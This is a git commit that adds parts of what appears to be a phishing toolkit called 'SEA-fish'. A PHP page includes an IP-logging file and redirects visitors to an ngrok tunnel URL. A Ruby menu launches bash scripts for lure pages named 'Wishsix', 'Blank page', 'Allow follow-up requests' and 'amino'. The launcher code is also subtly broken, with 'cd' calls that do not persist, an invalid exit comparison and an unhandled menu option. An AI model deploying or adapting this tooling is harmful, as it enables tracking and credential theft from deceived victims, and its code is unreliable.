c1c7d0b86efe8b3d297f4ec562ba161fe51e0eea
Jarjanazi <64444222+mrvanonmus@users.noreply.github.com>
2021-02-26 08:04:02 +0000

    Add files via upload

---
+++ Allow/index.php
@@ -0,0 +1,5 @@
+<?php
+include 'ip.php';
+header('Location: https://72fc03e6d2d6.ngrok.io/index2.html');
+exit
+?>
---
+++ SEA-fish.rb
@@ -0,0 +1,46 @@
+system("clear")
+puts("       _____   _____       ___ \n.     /  ___/ | ____|     /   | \n      | |___  | |__      / /| | \n.     \|___ \ | |  __|    / /_| | \n       ___| | | |___   / /__| |\n      /_____/ |_____| /_/   |_|") 
+  puts("[SEA]==========================[SEA]") 
+  puts("       my name: Alhamwi ") 
+  puts("       my insta: al0hamwi")  
+  puts("       my youtube: alhamwi")  
+  puts("       MADE IN SYRIA") 
+    
+  puts("[SEA]==========================[SEA]") 
+puts("\n            {1}Wishsix")
+puts("            {2}Blank page")
+puts("            {3}Allow follow-up requests")
+puts("            {4}amino")
+puts("            {5}Blank page")
+
+
+puts("\n\n[=====exit=====]\n\n")
+
+puts("\n       enter the number")
+num=gets.chomp.to_i
+ if num ==1
+  system("cd Wishsix")
+  
+  system("bash 1.sh")
+ 
+ elsif num ==2
+  system("cd Blank-page")
+  
+  system("bash 1.sh")
+  
+ elsif num ==3
+   system("cd Allow")
+  
+   system("bash 1.sh")
+   
+  elsif num ==4
+   system("cd amino")
+  
+   system("bash 1.sh")
+   
+   elsif num ==exit
+   system("exit && exit")
+ else
+   system("ruby SEA-fish.rb")
+ end
+ puts "good by"
